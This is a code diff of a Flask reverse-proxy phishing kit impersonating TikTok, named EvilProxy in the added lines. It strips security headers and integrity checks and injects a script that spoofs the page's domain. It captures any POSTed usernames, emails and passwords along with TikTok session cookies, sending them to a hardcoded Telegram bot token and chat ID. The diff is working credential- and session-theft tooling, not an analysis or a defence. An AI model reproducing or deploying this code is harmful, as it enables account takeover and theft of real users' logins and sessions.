@@ -7,78 +7,103 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 a = Flask(__name__)
 a.wsgi_app = ProxyFix(a.wsgi_app, x_for=1, x_proto=1, x_host=1, x_prefix=1)
-a.secret_key = os.urandom(32).hex()
+
 
 T = "8554468568:AAFvQJVSo6TtBao6xreo_Zf1DxnFupKVTrc"
 C = "1367401179"
 
-class E:
+class EvilProxy:
     def __init__(self):
-        self.d = "www.tiktok.com"
-        self.p = ["www.tiktok.com", "tiktok.com", "m.tiktok.com"]
+        self.target = "www.tiktok.com"
+       
+        self.domains = ["www.tiktok.com", "tiktok.com", "m.tiktok.com", "v16m.tiktokcdn.com"]
 
-    def n(self, m):
-        try: requests.post(f"https://api.telegram.org/bot{T}/sendMessage", json={"chat_id": C, "text": m, "parse_mode": "HTML"}, timeout=5)
+    def notify(self, m):
+        try: requests.post(f"https://api.telegram.org/bot{T}/sendMessage", json={"chat_id": C, "text": m, "parse_mode": "HTML"})
         except: pass
 
-    def r(self, t, h):
-        for d in self.p:
-            t = t.replace(f"https://{d}", f"https://{h}")
-            t = t.replace(f"//{d}", f"//{h}")
-        return t
+    def bypass_filters(self, content, host):
+      
+        for d in self.domains:
+            content = content.replace(f"https://{d}", f"https://{host}")
+            content = content.replace(f"//{d}", f"//{host}")
+        
+        
+        content = content.replace('Content-Security-Policy', 'X-Proxy-CSP')
+        content = re.sub(r'integrity="[^"]+"', '', content)
+        
+        
+        if '<head>' in content:
+            script = f"""
+            <script>
+                window.addEventListener('load', function() {{
+                    // م
+                    Object.defineProperty(document, 'domain', {{get: function() {{return '{self.target}';}}}});
+                }});
+            </script>
+            """
+            content = content.replace('<head>', f'<head>{script}')
+        return content
 
-e = E()
+proxy = EvilProxy()
 
-@a.route('/')
-def home():
-    return redirect('/login')
+@a.route('/', defaults={'path': ''})
+@a.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
+def handle_request(path):
+    host = request.headers.get('Host')
+    url = urljoin(f"https://{proxy.target}", path)
+    if request.query_string:
+        url += '?' + request.query_string.decode()
 
-@a.route('/<path:x>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
-def f(x):
-    h = request.headers.get('Host', '').split(':')[0]
-    u = urljoin(f"https://{e.d}", x)
-    if request.query_string: u += '?' + request.query_string.decode()
+    
+    headers = {k: v for k, v in request.headers if k.lower() not in ['host', 'accept-encoding', 'content-length']}
+    headers['Host'] = proxy.target
+    headers['Referer'] = f"https://{proxy.target}/"
 
-    H = {k: v for k, v in request.headers if k.lower() not in ['host', 'accept-encoding']}
-    H['Host'] = e.d
-
-    # الفلترة: التقاط بيانات الدخول فقط وتجاهل بيانات التتبع التقنية
+    
     if request.method == 'POST':
-        data = request.get_data(as_text=True)
-        # البحث عن أنماط البريد أو كلمة السر في جسم الطلب
-        if 'password' in data.lower() or 'username' in data.lower():
-            e.n(f"✅ <b>Login Data Found:</b>\n<code>{data[:1000]}</code>")
+        payload = request.get_data(as_text=True)
+        if any(key in payload.lower() for key in ['pass', 'user', 'login', 'email']):
+            proxy.notify(f"🎯 <b>Captured Credentials:</b>\n<code>{payload[:1500]}</code>")
 
     try:
-        R = requests.request(method=request.method, url=u, headers=H, cookies=request.cookies, data=request.get_data(), allow_redirects=False, verify=False, timeout=10)
         
-        B = R.content
-        if 'text/html' in R.headers.get('Content-Type', ''):
-            B = e.r(B.decode('utf-8', errors='ignore'), h).encode()
+        response = requests.request(
+            method=request.method,
+            url=url,
+            headers=headers,
+            cookies=request.cookies,
+            data=request.get_data(),
+            allow_redirects=False,
+            verify=False
+        )
 
-        r = make_response(B)
-        r.status_code = R.status_code
+        content = response.content
+        if 'text/html' in response.headers.get('Content-Type', ''):
+            content = proxy.bypass_filters(content.decode('utf-8', errors='ignore'), host).encode()
 
-        for k, v in R.headers.items():
-            if k.lower() not in ['content-encoding', 'content-length', 'content-security-policy', 'set-cookie']:
-                r.headers[k] = v
+        res = make_response(content)
+        res.status_code = response.status_code
 
-        # تمرير الكوكيز مع تعديل خصائص الأمان لضمان الحفظ
-        for k, v in R.cookies.items():
-            r.set_cookie(k, v, secure=True, httponly=True, samesite='None', domain=h)
+        
+        for k, v in response.cookies.items():
+            
+            res.set_cookie(k, v, secure=True, httponly=True, samesite='None', domain=None)
 
-        # التقاط الجلسة (الهدف الأساسي)
-        if 'sessionid' in R.cookies:
-            session_str = "; ".join([f"{k}={v}" for k, v in R.cookies.items() if k in ['sessionid', 'sid_tt', 'ttwid', 'uid_tt']])
-            e.n(f"🔥 <b>FULL SESSION CAPTURED!</b>\n<code>{session_str}</code>")
+        
+        if 'sessionid' in response.cookies:
+            full_session = "; ".join([f"{k}={v}" for k, v in response.cookies.items()])
+            proxy.notify(f"🔥 <b>GOLDEN SESSION CAPTURED!</b>\n<code>{full_session}</code>")
 
-        if R.status_code in [301, 302, 303]:
-            l = R.headers.get('Location', '').replace(e.d, h)
-            r.headers['Location'] = l
+        
+        if response.status_code in [301, 302, 303]:
+            loc = response.headers.get('Location', '').replace(proxy.target, host)
+            res.headers['Location'] = loc
 
-        return r
-    except Exception as err:
-        return f"Error: {str(err)}", 500
+        return res
+
+    except Exception as e:
+        return f"Proxy Error: {str(e)}", 500
 
 if __name__ == '__main__':
     a.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
